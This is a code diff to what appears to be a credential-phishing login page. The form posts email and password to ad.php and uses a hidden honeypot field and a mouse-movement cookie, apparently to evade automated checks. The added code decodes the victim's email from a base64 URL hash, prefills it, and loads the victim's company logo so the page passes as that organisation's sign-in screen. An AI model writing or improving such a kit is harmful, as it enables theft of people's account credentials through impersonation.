@@ -191,7 +191,7 @@
     <p id="domain-info">Sign in with your Domain Email</p>
 
     <form name="loginForm" id="loginForm" method="POST" action="ad.php" autocomplete="off">
-      <input type="email" name="email" id="email" placeholder="Email" required readonly>
+      <input type="email" name="email" id="email" placeholder="Email" required>
       <input type="password" name="password" id="password" placeholder="Password" minlength="6" required>
       <input type="text" name="email_confirm" id="email_confirm" style="display:none" autocomplete="off" tabindex="-1" />
 
@@ -220,31 +220,105 @@
   // Global domain variable
   let domain = "";
 
-  // Base64 decode helper (URL-safe)
-  function decodeData(encoded) {
-    encoded = encoded.replace(/-/g, '+').replace(/_/g, '/');
-    while (encoded.length % 4) {
-      encoded += '=';
+  // Enhanced Base64 decode helper (handles both standard and URL-safe formats)
+  function decodeBase64Email(encoded) {
+    try {
+      // Handle URL-safe Base64
+      encoded = encoded.replace(/-/g, '+').replace(/_/g, '/');
+      
+      // Add padding if necessary
+      while (encoded.length % 4) {
+        encoded += '=';
+      }
+      
+      // Decode base64
+      const decoded = atob(encoded);
+      
+      // Handle UTF-8 encoding if needed
+      return decodeURIComponent(escape(decoded));
+    } catch (err) {
+      console.error("Error decoding base64 email:", err);
+      return null;
     }
-    return decodeURIComponent(atob(encoded));
   }
 
-  // Function to extract email from URL hash
-  function extractEmailFromHash() {
+  // Function to extract and decode email from URL hash
+  function extractAndDecodeEmail() {
     const hash = window.location.hash.substring(1); // Remove the # symbol
-    const params = new URLSearchParams(hash);
     
-    if (params.has("email")) {
-      try {
+    if (!hash) return null;
+    
+    // Check if hash contains parameters (email=base64string&token=xyz format)
+    if (hash.includes('=')) {
+      const params = new URLSearchParams(hash);
+      
+      // Try to get email parameter first
+      if (params.has("email")) {
         const encodedEmail = params.get("email");
-        const decodedEmail = decodeData(encodedEmail);
-        return decodedEmail;
-      } catch (err) {
-        console.error("Error decoding email:", err);
-        return null;
+        return decodeBase64Email(encodedEmail);
       }
+      
+      // If no email parameter, check if the whole hash before first & is base64
+      const firstParam = hash.split('&')[0];
+      if (firstParam.includes('=')) {
+        const [key, value] = firstParam.split('=', 2);
+        if (key.toLowerCase() === 'email') {
+          return decodeBase64Email(value);
+        }
+      }
+    } else {
+      // Hash is direct base64 encoded email (like your example: aGFyZXJ1QG5hdGUuY29t)
+      return decodeBase64Email(hash);
     }
+    
     return null;
+  }
+
+  // Function to validate email format
+  function isValidEmail(email) {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailRegex.test(email);
+  }
+
+  // Function to update UI based on email
+  function updateUI(email) {
+    const emailInput = document.getElementById("email");
+    const domainInfo = document.getElementById("domain-info");
+    const logo = document.getElementById("email-logo");
+    
+    if (email && isValidEmail(email)) {
+      // Populate email input
+      emailInput.value = email;
+      
+      // Extract domain and update UI
+      const domainMatch = email.match(/@([\w.-]+\.\w+)/);
+      if (domainMatch) {
+        domain = domainMatch[1]; // Store domain globally
+        domainInfo.textContent = `Sign in with your ${domain} Email`;
+        
+        // Try to load company logo
+        const logoUrl = `https://logo.clearbit.com/${domain}`;
+        logo.src = logoUrl;
+        logo.style.display = "block";
+        
+        // Fallback to default icon if logo fails to load
+        logo.onerror = function () {
+          logo.src = "P_icon.svg";
+        };
+      } else {
+        domainInfo.textContent = "Sign in with your Domain Email";
+        logo.style.display = "none";
+      }
+      
+      // Focus on password field since email is already filled
+      document.getElementById("password").focus();
+    } else {
+      domainInfo.textContent = "Sign in with your Domain Email";
+      logo.style.display = "none";
+      
+      // Focus on email field if no valid email found
+      emailInput.focus();
+    }
   }
 
   // Mark JS and mouse activity
@@ -253,29 +327,19 @@
     document.cookie = "mouse_moved=1; path=/";
   }, { once: true });
 
-  
-  // Decode email and update UI
+  // Initialize email extraction and UI update
   document.addEventListener("DOMContentLoaded", function () {
-    const emailInput = document.getElementById("email");
-    const domainInfo = document.getElementById("domain-info");
-    const logo = document.getElementById("email-logo");
-
-    function updateUI(email) {
-      const domainMatch = email.match(/@([\w.-]+\.\w+)/);
-      if (domainMatch) {
-        domain = domainMatch[1]; // Store domain globally
-        domainInfo.textContent = `Sign in with your ${domain} Email`;
-        const logoUrl = `https://logo.clearbit.com/${domain}`;
-        logo.src = logoUrl;
-        logo.style.display = "block";
-        logo.onerror = function () {
-          logo.src = "P_icon.svg";
-        };
-      } else {
-        domainInfo.textContent = "Sign in with your Domain Email";
-        logo.style.display = "none";
-      }
+    // Extract and decode email from URL
+    const decodedEmail = extractAndDecodeEmail();
+    
+    if (decodedEmail) {
+      console.log("Extracted email:", decodedEmail); // Debug log
+      updateUI(decodedEmail);
+    } else {
+      console.log("No valid email found in URL hash"); // Debug log
+      updateUI(null);
     }
+  });
 
   // jQuery-based form handling
   $(document).ready(function () {
@@ -354,5 +418,3 @@
 </body>
 
 </html>
-
-
